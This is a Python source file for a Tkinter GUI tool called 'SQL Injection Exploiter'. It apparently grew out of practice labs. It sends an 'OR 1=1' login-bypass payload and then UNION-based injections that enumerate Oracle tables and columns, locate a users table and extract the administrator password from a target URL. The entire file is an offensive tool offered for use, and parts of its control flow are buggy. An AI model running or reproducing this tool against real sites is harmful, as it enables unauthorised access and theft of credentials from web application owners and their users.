import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import tkinter as tk
from tkinter import messagebox, StringVar

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload, method, post_data):
    if method == 'GET':
        r = requests.get(url+ sql_payload, verify=False,proxies=proxies)
    elif method == 'POST':
        r = requests.post(url, data=post_data, verify=False,proxies=proxies)
    else:
        raise ValueError("Invalid method specified.")
    return r

def try_login(url, method,post_data):
    sql_payload="'OR 1=1 # "
    def get_csrf_token(url):
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input")['value']
        return csrf
    try:
        csrf = get_csrf_token(url)
        if csrf:
            data = {"csrf": csrf}
            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
            data[list(data.keys())[1]] = sql_payload
            print(data)
        res = perform_request(url,sql_payload, method, data)
    
    except:
        post_data[list(post_data.keys())[0]] = sql_payload
        print(post_data)
        res = perform_request(url, sql_payload,method, post_data)
        if res.status_code == 200:
            return True,sql_payload
        else:
            return False              

def exploit_sqli_users_table(url, method, post_data):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables #"
    res = perform_request(url, sql_payload, method, post_data)
    print(res)
    soup = BeautifulSoup(res.text, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table

def exploit_sqli_users_columns(url, users_table, method='GET', post_data=None):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
    res = perform_request(url, sql_payload, method, post_data)
    soup = BeautifulSoup(res.text, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload, method, post_data)
    soup = BeautifulSoup(res.text, 'html.parser')
    admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

def main():
    def execute_sql_injection():
        try:
            url = url_entry.get().strip()
        except IndexError:
            messagebox.showerror("Error", "Please provide a valid URL.")
            return

        result_text.delete(1.0, tk.END)  # Clear previous results

        method = 'GET' if method_var.get() == 0 else 'POST'
        data = post_data_entry.get() if method == 'POST' else None
        post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
        if try_login_option.get():
            login_successful = try_login(url, method, post_data)
        if login_successful[0]:
            result_text.insert(tk.END, "[+] Login Successful!\n")
            result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
        else:
            result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
            return

        print("Looking for the users table...")
        users_table = exploit_sqli_users_table(url, method, post_data)
        if users_table:
            result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
            username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data)
            if username_column and password_column:
                result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
                result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)

                admin_password = exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method, post_data)
                if admin_password:
                    result_text.insert(tk.END, "[+] The administrator password is: %s\n" % admin_password)
                else:
                    result_text.insert(tk.END, "Did not find the administrator password\n")
            else:
                result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
        else:
            result_text.insert(tk.END, "Did not find a users table.\n")

    root = tk.Tk()
    root.title("SQL Injection Exploiter")

    url_label = tk.Label(root, text="Enter URL:")
    url_label.pack()

    url_entry = tk.Entry(root, width=40)
    url_entry.pack()

    method_var = tk.IntVar()
    method_checkbutton = tk.Checkbutton(root, text="Use POST", variable=method_var)
    method_checkbutton.pack()

    post_data_label = tk.Label(root, text="Enter POST Data:")
    post_data_label.pack()

    post_data_entry = tk.Entry(root, width=40)
    post_data_entry.pack()

    try_login_option = tk.BooleanVar()
    try_login_checkbutton = tk.Checkbutton(root, text="Try Login", variable=try_login_option)
    try_login_checkbutton.pack()

    execute_button = tk.Button(root, text="Execute SQL Injection", command=execute_sql_injection)
    execute_button.pack()

    result_label = tk.Label(root, text="Results:")
    result_label.pack()

    result_text = tk.Text(root, height=10, width=60)
    result_text.pack()

    root.mainloop()

if __name__ == "__main__":
    main()
